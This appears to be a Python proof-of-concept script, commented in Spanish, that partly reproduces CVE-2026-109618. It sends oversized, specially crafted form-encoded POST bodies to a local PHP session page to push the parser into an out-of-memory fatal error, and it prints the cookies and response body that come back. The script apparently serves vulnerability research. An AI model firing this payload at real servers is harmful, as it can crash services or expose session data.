#!/usr/bin/env python3
"""Reproduccion parcial CVE-2026-109618 estilo Datadog: OOM en el parser.
No ejecuta comandos: solo mide la transicion normal -> fatal error."""
import http.client, os, urllib.parse

def attempt(nbytes):
    binary = os.urandom(276)
    val = urllib.parse.quote_from_bytes(binary, safe="")
    body = (b"=" + val.encode() + b"&a=1&" + b"A" * nbytes + b"[x]=1")
    c = http.client.HTTPConnection("127.0.0.1", 80, timeout=90)
    c.request("POST", "/session2.php", body=body, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(len(body)),
        "Connection": "close",
    })
    r = c.getresponse()
    data = r.read(300)
    sc = r.getheader("Set-Cookie") or ""
    print(f"N={nbytes/1048576:.2f}MB status={r.status} body_len={len(data)} "
          f"cookie_len={len(sc)}")
    print("cookie:", sc[:120])
    print("body:", data[:200])
    c.close()

for mb in (2.88, 3.00):
    attempt(int(mb * 1024 * 1024))
    print("-" * 60)
